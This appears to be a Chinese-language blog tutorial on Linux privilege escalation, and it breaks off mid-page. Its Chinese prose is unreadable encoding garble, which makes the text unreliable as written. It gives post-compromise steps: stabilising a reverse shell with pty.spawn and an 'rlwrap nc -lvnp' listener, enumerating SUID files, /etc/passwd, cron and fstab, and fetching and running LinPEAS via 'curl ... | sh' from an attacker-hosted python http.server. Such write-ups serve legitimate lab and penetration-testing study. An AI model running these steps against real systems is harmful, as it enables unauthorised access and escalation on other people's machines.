SElinux</h3><ul><li>AppArmor æ˜¯ä¸€ç§ä¸»è¦åŸºäºè·¯å¾„çš„å¼ºåˆ¶è®¿é—®æ§åˆ¶ï¼ˆMACï¼‰ç³»ç»Ÿï¼Œå®ƒå…è®¸ç³»ç»Ÿç®¡ç†å‘˜ä¸ºæ¯ä¸ªç¨‹åºå®šä¹‰ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ¥æ§åˆ¶ç¨‹åºå¯ä»¥è®¿é—®çš„æ–‡ä»¶å’Œæƒé™ã€‚ ä¸¾ä¸ªä¾‹å­, ä½¿ç”¨ AppArmor å¯ä»¥ä¸ºä¸€ä¸ªç‰¹å®šçš„ç¨‹åºæŒ‡å®šåªèƒ½è¯»å–ç‰¹å®šç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</li><li>SELinux åŸºäºç­–ç•¥æ¥æ§åˆ¶ç¨‹åºä¹‹é—´ä»¥åŠç¨‹åºä¸æ–‡ä»¶ä¹‹é—´çš„äº¤äº’ã€‚ä¸ AppArmor ä¸åŒï¼ŒSELinux ä¸ä»…åŸºäºè·¯å¾„ï¼Œè€Œä¸”ä½¿ç”¨äº†ä¸€å¥—å¤æ‚çš„æ ‡ç­¾ç³»ç»Ÿï¼ˆåŒ…æ‹¬ç±»å‹ã€è§’è‰²ã€ç”¨æˆ·ç­‰æ ‡ç­¾ï¼‰ï¼Œè¿™ä½¿å¾—å®ƒå¯ä»¥å®ç°æ›´ç²¾ç»†åŒ–çš„å®‰å…¨æ§åˆ¶ã€‚</li></ul><h3 id="ä¸å¸¸ç”¨çš„å®‰å…¨æœºåˆ¶"><a href="#ä¸å¸¸ç”¨çš„å®‰å…¨æœºåˆ¶" class="headerlink" title="ä¸å¸¸ç”¨çš„å®‰å…¨æœºåˆ¶"></a>ä¸å¸¸ç”¨çš„å®‰å…¨æœºåˆ¶</h3><ul><li><strong>Grsecurity</strong>: ä¸ºLinuxå†…æ ¸æä¾›å„ç§å®‰å…¨å¢å¼ºå’Œè¡¥ä¸çš„é¡¹ç›®, åŠŸèƒ½åŒ…æ‹¬è§’è‰²åŸºç¡€è®¿é—®æ§åˆ¶ (RBAC), å†…å­˜ä¿æŠ¤,å®¡è®¡ç­‰</li><li><strong>Pax</strong>: åŸºäºå†…æ ¸çš„ä¿æŠ¤è¡¥ä¸</li><li><strong>ExecShield</strong>: å¯æ‰§è¡Œæ–‡ä»¶çš„â€˜ç›¾â€™,ä¹Ÿæ˜¯åŸºäºå†…æ ¸çš„å®‰å…¨æœºåˆ¶</li><li><strong>ASLR(Address Space Layout Random)</strong>: åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–</li><li><strong>TOMOYO Linux</strong>: ä¹Ÿæ˜¯åŸºäº MAC çš„å†…æ ¸å®‰å…¨æ¨¡å—, æ¯”AppArmorè½»é‡çº§</li><li><strong>SMACK (Simplified Mandatory Access Control Kernel)</strong>: SMACKæ˜¯ä¸€ä¸ªç”¨äºLinuxçš„ç®€åŒ–çš„å¼ºåˆ¶è®¿é—®æ§åˆ¶ç³»ç»Ÿã€‚å®ƒæä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œå…è®¸ç³»ç»Ÿç®¡ç†å‘˜å®šä¹‰è®¿é—®æ§åˆ¶è§„åˆ™ï¼Œè¿™äº›è§„åˆ™æŒ‡å®šå“ªäº›è¿›ç¨‹å¯ä»¥è®¿é—®å“ªäº›æ–‡ä»¶å’Œèµ„æºã€‚</li><li><strong>Yama</strong>: Yamaæ˜¯ä¸€ä¸ªLinuxå†…æ ¸å®‰å…¨æ¨¡å—ï¼Œæä¾›äº†ä¸€ç³»åˆ—å®‰å…¨ç­–ç•¥ã€‚å®ƒæœ€è‘—åçš„åŠŸèƒ½ä¹‹ä¸€æ˜¯é™åˆ¶ptraceç³»ç»Ÿè°ƒç”¨ï¼Œè¿™æœ‰åŠ©äºé˜²æ­¢æŸäº›ç±»å‹çš„å®‰å…¨æ¼æ´ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹è°ƒè¯•å’Œç³»ç»Ÿç›‘æ§å·¥å…·çš„æ”»å‡»ã€‚</li><li><strong>CGroups (Control Groups)</strong>: CGroupsæ˜¯Linuxå†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼Œå…è®¸å¯¹ç³»ç»Ÿèµ„æºï¼ˆå¦‚CPUæ—¶é—´ã€ç³»ç»Ÿå†…å­˜ã€ç½‘ç»œå¸¦å®½ç­‰ï¼‰è¿›è¡Œåˆ†ç»„ç®¡ç†å’Œé™åˆ¶ã€‚è¿™æœ‰åŠ©äºå®ç°èµ„æºåˆ†é…ã€ä¼˜å…ˆçº§æ§åˆ¶ç­‰ã€‚</li><li><strong>Linux Namespaces</strong>: Linuxå‘½åç©ºé—´æ˜¯ä¸€ç§æä¾›éš”ç¦»çš„æŠ€æœ¯ï¼Œå®ƒå¯ä»¥å°†ç³»ç»Ÿçš„ä¸åŒéƒ¨åˆ†ï¼ˆå¦‚è¿›ç¨‹ã€ç½‘ç»œã€æ–‡ä»¶ç³»ç»Ÿç­‰ï¼‰éš”ç¦»å¼€æ¥ï¼Œä½¿å¾—åœ¨ä¸€ä¸ªå‘½åç©ºé—´ä¸­çš„è¿›ç¨‹çœ‹ä¸åˆ°å¦ä¸€ä¸ªå‘½åç©ºé—´ä¸­çš„èµ„æºã€‚è¿™æ˜¯å®¹å™¨æŠ€æœ¯çš„å…³é”®ç»„æˆéƒ¨åˆ†ã€‚</li><li><strong>StackGuard</strong>: StackGuardæ˜¯ä¸€ä¸ªç¼–è¯‘æ—¶å®‰å…¨ç‰¹æ€§ï¼Œç”¨äºé˜²èŒƒæ ˆæº¢å‡ºæ”»å‡»ã€‚å®ƒé€šè¿‡åœ¨æ ˆä¸Šæ’å…¥ç‰¹æ®Šçš„â€œå“¨å…µâ€å€¼æ¥å·¥ä½œï¼Œè¿™äº›å€¼åœ¨å‡½æ•°è°ƒç”¨æ—¶æ£€æŸ¥ï¼Œä»¥é˜²æ­¢æ ˆç¼“å†²åŒºæº¢å‡ºã€‚</li><li><strong>Proplice</strong>: è¿™å¯èƒ½æ˜¯å¯¹â€œPolkitâ€ï¼ˆä»¥å‰ç§°ä¸ºPolicyKitï¼‰çš„æåŠï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºæ§åˆ¶ç³»ç»ŸèŒƒå›´å†…ç‰¹æƒçš„æ¡†æ¶ã€‚å®ƒå…è®¸éç‰¹æƒè¿›ç¨‹å‘ç‰¹æƒè¿›ç¨‹è¯·æ±‚æ‰§è¡Œç‰¹å®šä»»åŠ¡ã€‚</li><li><strong>seccomp (Secure Computing Mode)</strong>: seccompæ˜¯ä¸€ä¸ªLinuxå†…æ ¸ç‰¹æ€§ï¼Œå…è®¸ä¸€ä¸ªè¿›ç¨‹è®¾å®šä¸€ä¸ªâ€œå®‰å…¨æ¨¡å¼â€ï¼Œè¿™ä¸ªæ¨¡å¼å°†é™åˆ¶è¿›ç¨‹å¯ä»¥è°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨ã€‚è¿™æœ‰åŠ©äºé™åˆ¶è¿›ç¨‹çš„è¡Œä¸ºï¼Œé˜²æ­¢å®‰å…¨æ¼æ´ã€‚</li><li><strong>ptrace</strong>: ptraceæ˜¯ä¸€ç§ç”¨äºè°ƒè¯•å’Œç›‘æ§Linuxè¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ã€‚å®ƒå…è®¸ä¸€ä¸ªè¿›ç¨‹è§‚å¯Ÿå’Œæ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œï¼Œä»¥åŠæ£€æŸ¥å’Œæ”¹å˜å…¶å†…å­˜å’Œå¯„å­˜å™¨ç­‰ã€‚</li><li><strong>Capsicum</strong>: Capsicumæ˜¯ä¸€ç§è½»é‡çº§çš„æ“ä½œç³»ç»Ÿèƒ½åŠ›å’Œæ²™ç®±æœºåˆ¶ï¼Œæœ€åˆæ˜¯ä¸ºFreeBSDå¼€å‘çš„ï¼Œä½†ä¹Ÿæœ‰Linuxå®ç°ã€‚å®ƒå…è®¸åº”ç”¨ç¨‹åºä»¥æœ€å°çš„ç‰¹æƒè¿è¡Œã€‚</li><li><strong>Mprotect</strong>: Mprotectæ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå…è®¸æ”¹å˜ä¸€ä¸ªè¿›ç¨‹å†…å­˜åŒºåŸŸçš„ä¿æŠ¤ã€‚è¿™å¯ä»¥ç”¨æ¥é˜²æ­¢ç¨‹åºçš„æŸäº›éƒ¨åˆ†è¢«ä¿®æ”¹ï¼Œæˆ–è€…é˜²æ­¢æ‰§è¡Œéæ‰§è¡Œå†…å­˜åŒºåŸŸï¼Œä½œä¸ºå®‰å…¨æªæ–½ã€‚</li><li><strong>chroot</strong>: chrootæ˜¯ä¸€ç§æ”¹å˜è¿›ç¨‹çš„æ ¹ç›®å½•çš„æ“ä½œã€‚è¿™å¯ä»¥ç”¨æ¥åˆ›å»ºä¸€ä¸ªéš”ç¦»çš„ç¯å¢ƒï¼Œå…¶ä¸­è¿›ç¨‹ä¸èƒ½è®¿é—®ä¸»æ–‡ä»¶ç³»ç»Ÿä¹‹å¤–çš„æ–‡ä»¶ã€‚</li><li><strong>firejail</strong>: firejailæ˜¯ä¸€ä¸ªæ²™ç®±ç¨‹åºï¼Œç”¨äºé™åˆ¶åº”ç”¨ç¨‹åºçš„è¿è¡Œç¯å¢ƒã€‚å®ƒé€šè¿‡ä½¿ç”¨Linuxå‘½åç©ºé—´å’Œseccomp-bpfç­‰æŠ€æœ¯æ¥æä¾›éš”ç¦»å’Œå®‰å…¨æ§åˆ¶ã€‚</li></ul><h2 id="ææƒåŸç†"><a href="#ææƒåŸç†" class="headerlink" title="ææƒåŸç†"></a>ææƒåŸç†</h2><ol><li>ä½æƒé™å¯ä»¥ä¿®æ”¹å¯æ‰§è¡Œæ–‡ä»¶æˆ–è€…è„šæœ¬, ç„¶åèƒ½å¤Ÿä»¥é«˜æƒé™è¿è¡Œè¿™ä¸ªæ–‡ä»¶æˆ–è€…è„šæœ¬.</li><li>ä»ç”¨æˆ·è¡Œä¸ºçš„è§’åº¦, è¿ç»´äººå‘˜çš„æ“ä½œä¹ æƒ¯, ç®¡ç†æ ‡å‡†, ä»–ä»¬ä¼šæŠŠæ•æ„Ÿä¿¡æ¯ç•™ä¸‹æ–¹ä¾¿ä»–ä»¬æ“ä½œ.</li><li>æœ‰æœºä¼šèƒ½å¤Ÿåœ¨æƒé™ä½“ç³»ä¸Šå±‚ææƒ, å¦‚å†…å­˜, cpu è¿›è¡Œæ“ä½œ, åœ¨æƒé™ä¸Šå±‚æ•æ‰,æ‹¦æˆª,ä¿®æ”¹å‡­æ®ä¿¡æ¯, å¦‚åŸºäºå†…å­˜å»è¯»å–æ•æ„Ÿä¿¡æ¯çš„å†…æ ¸åˆ©ç”¨.</li></ol><h2 id="æƒé™æšä¸¾"><a href="#æƒé™æšä¸¾" class="headerlink" title="æƒé™æšä¸¾"></a>æƒé™æšä¸¾</h2><h3 id="æšä¸¾å‡†å¤‡"><a href="#æšä¸¾å‡†å¤‡" class="headerlink" title="æšä¸¾å‡†å¤‡"></a>æšä¸¾å‡†å¤‡</h3><p>æƒé™æšä¸¾ä¹‹å‰, å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æé«˜ç»ˆç«¯äº¤äº’æ€§å’Œç¨³å®šæ€§:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">stty raw -<span class="built_in">echo</span></span><br><span class="line">export TERM=xterm-<span class="built_in">color</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå‘½ä»¤é€šè¿‡ python å¼€å¯ä¸€ä¸ª bash ä¼šè¯, ç„¶åè®© stty é€šè¿‡è¡Œè¯»å–å¹¶ç¦ç”¨ echo. ç„¶åå¯ä»¥ä½¿ç”¨</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -lvnp ç«¯å£å·</span><br></pre></td></tr></table></figure><p>åœ¨è·å–åå¼¹ shell ä¹‹å‰, ç”¨ rlwrap åŒ…è£¹èµ·æ¥, è¿™æ ·å°±å¯ä»¥åœ¨ç»ˆç«¯ä¸­ç”¨æ–¹å‘é”®ç¿»å‘½ä»¤.</p><h3 id="æ‰‹åŠ¨æšä¸¾"><a href="#æ‰‹åŠ¨æšä¸¾" class="headerlink" title="æ‰‹åŠ¨æšä¸¾"></a>æ‰‹åŠ¨æšä¸¾</h3><p>åœ¨è¿™é‡Œåˆ—ä¸¾çš„æ‰€æœ‰å‘½ä»¤ä¸­, ç¬¬ä¸€æ¡æ˜¯ä¸»å‘½ä»¤,å¤§å¤šæƒ…å†µé€‚ç”¨</p><h4 id="æŸ¥çœ‹å½“å‰æƒé™"><a href="#æŸ¥çœ‹å½“å‰æƒé™" class="headerlink" title="æŸ¥çœ‹å½“å‰æƒé™"></a>æŸ¥çœ‹å½“å‰æƒé™</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whoami # æŸ¥çœ‹è‡ªå·±çš„ç”¨æˆ·</span><br><span class="line">id    # æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·çš„æƒé™ä¿¡æ¯</span><br><span class="line">who   # å½“å‰ç™»å½•çš„ç”¨æˆ·å’Œç›¸å…³ä¿¡æ¯, å¯ä»¥çœ‹é™¤äº†è‡ªå·±ä»¥å¤–å“ªäº›ç”¨æˆ·ç™»å½•äº†</span><br><span class="line">w     # å½“å‰ç™»å½•ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</span><br><span class="line">last  # æ˜¾ç¤ºç³»ç»Ÿæœ€è¿‘çš„ç™»å½•è®°å½•</span><br></pre></td></tr></table></figure><h4 id="çœ‹å†…æ ¸ç‰ˆæœ¬"><a href="#çœ‹å†…æ ¸ç‰ˆæœ¬" class="headerlink" title="çœ‹å†…æ ¸ç‰ˆæœ¬"></a>çœ‹å†…æ ¸ç‰ˆæœ¬</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname -a #æŸ¥çœ‹å½“å‰å†…æ ¸ç‰ˆæœ¬</span><br><span class="line">lsb_release -a #æŸ¥çœ‹æ›´è¯¦ç»†çš„ä¿¡æ¯</span><br><span class="line">cat /proc/version </span><br><span class="line">cat /etc/issue</span><br><span class="line">hostnamectl</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹å½“å‰æœºå™¨çš„-IP-åœ°å€"><a href="#æŸ¥çœ‹å½“å‰æœºå™¨çš„-IP-åœ°å€" class="headerlink" title="æŸ¥çœ‹å½“å‰æœºå™¨çš„ IP åœ°å€"></a>æŸ¥çœ‹å½“å‰æœºå™¨çš„ IP åœ°å€</h4><p>ç”¨äºæ¨ªå‘æ¸—é€è·å–å†…ç½‘ä¿¡æ¯</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip addr  # æœ€æ–°æœ€é€šç”¨çš„æ–¹æ³•</span><br><span class="line">ifconfig # æ—§æœºå™¨çš„æŸ¥çœ‹ ip æ–¹æ³•</span><br><span class="line">ip route # æŸ¥çœ‹è·¯ç”±è¡¨</span><br><span class="line">ip neigh # æŸ¥çœ‹ç½‘ç»œé‚»å±…</span><br><span class="line">arp -a   # å±€åŸŸç½‘ä¸­å“ªäº› mac åœ°å€å’Œ ip åœ°å€åšäº†ç»‘å®š</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹æœºå™¨åç§°"><a href="#æŸ¥çœ‹æœºå™¨åç§°" class="headerlink" title="æŸ¥çœ‹æœºå™¨åç§°"></a>æŸ¥çœ‹æœºå™¨åç§°</h4><p>ç”¨äºå®šä½è§’è‰²æ¥æ’é™¤æ•°æ®çš„ä¼˜å…ˆçº§</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hostname # çœ‹è¿™ä¸ªæœºå™¨çš„åå­—</span><br><span class="line">hostnamectl #æ›´è¯¦ç»†ä¸€ç‚¹</span><br></pre></td></tr></table></figure><h4 id="çœ‹å½“å‰ç”¨æˆ·æœ‰å“ªäº›ä»¥-root-çš„èº«ä»½æ‰§è¡Œçš„"><a href="#çœ‹å½“å‰ç”¨æˆ·æœ‰å“ªäº›ä»¥-root-çš„èº«ä»½æ‰§è¡Œçš„" class="headerlink" title="çœ‹å½“å‰ç”¨æˆ·æœ‰å“ªäº›ä»¥ root çš„èº«ä»½æ‰§è¡Œçš„"></a>çœ‹å½“å‰ç”¨æˆ·æœ‰å“ªäº›ä»¥ <code>root</code> çš„èº«ä»½æ‰§è¡Œçš„</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹æƒé™ä½“ç³»"><a href="#æŸ¥çœ‹æƒé™ä½“ç³»" class="headerlink" title="æŸ¥çœ‹æƒé™ä½“ç³»"></a>æŸ¥çœ‹æƒé™ä½“ç³»</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / <span class="number">2</span>&gt;/dev/null # ç”¨ -r æŒ‡å®šæ ¹ç›®å½•, é”™è¯¯ä¿¡æ¯æ‰”æ‰</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹å‘½ä»¤"><a href="#æŸ¥çœ‹å‘½ä»¤" class="headerlink" title="æŸ¥çœ‹å‘½ä»¤"></a>æŸ¥çœ‹å‘½ä»¤</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -liah # æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶,åŒ…æ‹¬éšè—æ–‡ä»¶</span><br><span class="line">ls -a    # æŸ¥çœ‹å…¨éƒ¨æ–‡ä»¶</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹-passwd-æ–‡ä»¶"><a href="#æŸ¥çœ‹-passwd-æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹ passwd æ–‡ä»¶"></a>æŸ¥çœ‹ <code>passwd</code> æ–‡ä»¶</h4><p>æŸ¥çœ‹ç”¨æˆ·(åç§°:å¯†ç ç›®å½• + æè¿° + bash ç¯å¢ƒ)</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd # è·å–ç”¨æˆ·æè¿°(æœ‰ home ç›®å½•çš„å°±æ˜¯æ´»è·ƒç”¨æˆ·)+å¯¹åº”çš„ bash ç¯å¢ƒ</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹è‡ªåŠ¨ä»»åŠ¡"><a href="#æŸ¥çœ‹è‡ªåŠ¨ä»»åŠ¡" class="headerlink" title="æŸ¥çœ‹è‡ªåŠ¨ä»»åŠ¡"></a>æŸ¥çœ‹è‡ªåŠ¨ä»»åŠ¡</h4><p>å…·ä½“çœ‹æ˜¯å¦æœ‰ root æƒé™çš„è‡ªåŠ¨ä»»åŠ¡</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹ç¯å¢ƒå˜é‡"><a href="#æŸ¥çœ‹ç¯å¢ƒå˜é‡" class="headerlink" title="æŸ¥çœ‹ç¯å¢ƒå˜é‡"></a>æŸ¥çœ‹ç¯å¢ƒå˜é‡</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $<span class="built_in">PATH</span> # æŸ¥çœ‹è·¯å¾„</span><br><span class="line">env  # çœ‹æ•´ä½“ç¯å¢ƒå˜äº†</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯"><a href="#æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯"></a>æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯</h4><p>å±•ç¤ºå‡ºæ¥çš„åˆ—ä¸­, UID æ˜¯ç”¨æˆ·ç±»å‹, PID æ˜¯è¿›ç¨‹å·,<br>TTY æ˜¯ç»ˆç«¯ç±»å‹, TIME æ˜¯è¿›ç¨‹ä½¿ç”¨çš„ cpu æ—¶é—´, CMD æ˜¯è¿›ç¨‹æ­£åœ¨è¿è¡Œçš„å‘½ä»¤å’Œå¯æ‰§è¡Œæ–‡ä»¶</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps -ef  # é€šç”¨</span><br><span class="line">ps axjf # a æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹, x æ²¡æœ‰è¿æ¥åˆ°ç»ˆç«¯çš„è¿›ç¨‹, j æ˜¾ç¤ºè¿›ç¨‹æ•°, f è¾“å‡ºæ ¼å¼</span><br><span class="line">ps <span class="built_in">aux</span>  # u æ˜¾ç¤ºå¯åŠ¨è¿›ç¨‹çš„ç”¨æˆ·</span><br><span class="line">top -n <span class="number">1</span> # top æ˜¯å®šæ—¶åˆ·æ–°è¿›ç¨‹çš„, ç”¨ -n <span class="number">1</span> è®©ä»–åªæ˜¾ç¤ºä¸€æ¬¡</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹ç½‘ç»œç»Ÿè®¡"><a href="#æŸ¥çœ‹ç½‘ç»œç»Ÿè®¡" class="headerlink" title="æŸ¥çœ‹ç½‘ç»œç»Ÿè®¡"></a>æŸ¥çœ‹ç½‘ç»œç»Ÿè®¡</h4><p>å¯ä»¥çœ‹åˆ°å ç”¨ç«¯å£çš„ç¨‹åº,å’Œä»–çš„è¿›ç¨‹ id</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat -a # æŸ¥çœ‹æ‰€æœ‰</span><br><span class="line">netstat -au # åˆ—å‡ºæ‰€æœ‰ TCP, UDP è¿æ¥çš„ç«¯å£</span><br><span class="line">netstat -l # åˆ—å‡ºç›‘å¬çš„ç«¯å£</span><br><span class="line">netstat -s # ç»Ÿè®¡ç½‘ç»œä½¿ç”¨çš„æƒ…å†µ</span><br><span class="line">netstat -ano # n ä¸è§£æåç§°, o æ˜¾ç¤ºè®¡æ—¶å™¨</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹æœ‰-S-ä½çš„å¯æ‰§è¡Œæ–‡ä»¶"><a href="#æŸ¥çœ‹æœ‰-S-ä½çš„å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹æœ‰ S ä½çš„å¯æ‰§è¡Œæ–‡ä»¶"></a>æŸ¥çœ‹æœ‰ S ä½çš„å¯æ‰§è¡Œæ–‡ä»¶</h4><p> 2&gt;&#x2F;dev&#x2F;null æŠŠæŠ¥é”™ä¿¡æ¯ç»™æ‰”æ‰</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹å·¥å…·æ˜¯å¦æœ‰å®‰è£…"><a href="#æŸ¥çœ‹å·¥å…·æ˜¯å¦æœ‰å®‰è£…" class="headerlink" title="æŸ¥çœ‹å·¥å…·æ˜¯å¦æœ‰å®‰è£…"></a>æŸ¥çœ‹å·¥å…·æ˜¯å¦æœ‰å®‰è£…</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">which å·¥å…·</span><br><span class="line">which awk perl python ruby gcc vi vim nmap <span class="built_in">find</span> nc wget tftp <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹å“ªäº›ç£ç›˜æ²¡è¢«æŒ‚è½½"><a href="#æŸ¥çœ‹å“ªäº›ç£ç›˜æ²¡è¢«æŒ‚è½½" class="headerlink" title="æŸ¥çœ‹å“ªäº›ç£ç›˜æ²¡è¢«æŒ‚è½½"></a>æŸ¥çœ‹å“ªäº›ç£ç›˜æ²¡è¢«æŒ‚è½½</h4><p>è¿ç»´äººå‘˜åšå¤‡ä»½æˆ–è€…åšç³»ç»Ÿå¿«ç…§æ—¶, ä¼šç”¨ä¸€ä¸ªä¸´æ—¶æŒ‚è½½çš„ç£ç›˜å­˜å–è¿™äº›æ•æ„Ÿä¿¡æ¯.</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure><h3 id="è‡ªåŠ¨åŒ–æšä¸¾"><a href="#è‡ªåŠ¨åŒ–æšä¸¾" class="headerlink" title="è‡ªåŠ¨åŒ–æšä¸¾"></a>è‡ªåŠ¨åŒ–æšä¸¾</h3><p>å…ˆè¯´è¯´ç¼ºç‚¹:</p><p>è‡ªåŠ¨åŒ–æšä¸¾å¾€å¾€è¦æ¬è¿å·¥å…·, ä¼šäº§ç”Ÿæµé‡å’Œæµé‡ç‰¹å¾, ä¸”æšä¸¾çš„æ¶ˆæ¯ååˆ†å†—é•¿, è¦ååˆ†ç†Ÿæ‚‰æ‰èƒ½æ‰¾åˆ°å¥½çš„ä¿¡æ¯, è€Œä¸”é’ˆå¯¹æ€§å¾ˆå·®.</p><p>è¿™é‡Œåˆ—ä¸¾å·¥å…·,è®°å¾—åœ¨ release é‡Œæ‰¾åˆ°å¯¹åº”ç³»ç»Ÿçš„æ”¯æŒ,å†å»æ¬è¿</p><ol><li>PEASS-ng (ä¸»è¦)</li><li>LinEnum (å¤‡é€‰)</li><li>Linux-smart-enumeration (å¤‡é€‰)</li><li>Linux-exploit-suggester (å¤‡é€‰)</li><li>linuxprivchecker (å¤‡é€‰,ä¸»è¦ç”¨ python)</li><li>unix-privesc-check (è¶…çº§å¤‡é€‰</li></ol><p>ä¸åŒç³»ç»Ÿå¯èƒ½æ²¡å®‰è£…å¯¹åº”çš„è¯­è¨€, æˆ–è€…å¯¹ç‰¹å®šè¯­è¨€çš„å‡½æ•°åšäº†è¿‡æ»¤, è¦å¤šæ¢å‡ ä¸ªå·¥å…·.</p><p>ä»¥ LinPEASS ä¸ºä¾‹, ä»¥ä¸‹æ˜¯æ“ä½œæ–¹æ³•:</p><h4 id="ä¼ ç»Ÿæ–¹æ³•"><a href="#ä¼ ç»Ÿæ–¹æ³•" class="headerlink" title="ä¼ ç»Ÿæ–¹æ³•:"></a>ä¼ ç»Ÿæ–¹æ³•:</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp # å¤§å¤šæ•°åœ¨ tmp ç›®å½•ä¸‹åš</span><br><span class="line">wget https:.... # æ¬è¿å·¥å…·</span><br><span class="line">ls # æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">chmod +x linpeas.sh # èµ‹äºˆæƒé™</span><br><span class="line">./linpeas.sh # æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h4 id="æ¨èæ–¹æ³•-æœ‰-curl"><a href="#æ¨èæ–¹æ³•-æœ‰-curl" class="headerlink" title="æ¨èæ–¹æ³•(æœ‰ curl):"></a>æ¨èæ–¹æ³•(æœ‰ curl):</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https:... | sh </span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨ <code>-L</code> è¿½éšé‡å®šå‘, ç”¨ <code>|</code> ç®¡é“ç¬¦è¿æ¥åˆ° <code>sh</code> ç›´æ¥æ‰§è¡Œ,å°±ä¸ä¼šå†æœ¬åœ°å­˜å‚¨.</p><p>å¦‚æœè¿ä¸åˆ°å¤–ç½‘, å°±è¦å…ˆåœ¨è‡ªå·±çš„æœºå­æœ¬åœ°ä¸‹è½½ sh æ–‡ä»¶, ç„¶ååœ¨å¯åŠ¨ç›‘å¬, å† curl è¿‡å»é¶æœº.</p><p>æœ¬åœ°æœº 1:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server ç«¯å£</span><br></pre></td></tr></table></figure><p>é¶æœº:</p><figure class="highlight 